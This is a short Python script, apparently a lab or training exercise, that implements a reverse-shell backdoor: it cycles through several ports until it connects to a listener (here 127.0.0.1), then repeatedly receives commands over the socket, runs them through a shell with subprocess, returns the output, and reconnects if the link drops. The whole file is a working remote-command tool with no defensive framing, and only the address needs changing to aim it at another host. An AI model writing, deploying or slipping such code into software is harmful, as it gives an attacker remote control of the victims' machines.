from __future__ import print_function
import socket
import time
import subprocess

def scan_and_connect():
    print("it started")
    connected = False
    while not connected:
        for port in [21, 22, 81, 443, 8000]:
            time.sleep(0.5)
            try:
                print("Trying", port, end=' ')
                mysocket.connect(("127.0.0.1", port))
            except socket.error:
                print("Nope")
                continue
            else:
                print("Connected")
                connected = True
                break

mysocket = socket.socket()
scan_and_connect()
while True:
    try:
        commandrequested = mysocket.recv(1024).decode()
        if len(commandrequested) == 0:
            time.sleep(3)
            mysocket = socket.socket()
            scan_and_connect()
            continue
        if commandrequested[:4] == "QUIT":
            mysocket.send("Terminating Connection.".encode())
            break
        prochandle = subprocess.Popen(
            commandrequested,  shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        results, errors = prochandle.communicate()
        mysocket.send(results + errors)
    except socket.error:
        break
    except Exception as e:
        mysocket.send(str(e).encode())
        break
